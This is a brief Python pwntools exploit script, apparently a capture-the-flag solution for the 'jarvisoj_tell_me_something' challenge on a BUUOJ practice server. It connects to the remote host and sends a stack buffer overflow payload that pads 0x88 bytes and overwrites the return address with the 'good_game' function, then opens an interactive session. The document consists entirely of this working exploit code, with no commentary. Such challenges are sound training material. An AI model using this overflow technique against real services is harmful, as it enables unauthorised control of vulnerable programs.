from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29608)
e = ELF('./jarvisoj_tell_me_something')
good_game = e.symbols['good_game']
payload = b'a'*0x88 + p64(good_game)
io.sendlineafter(b'Input your message:\n', payload)
io.interactive()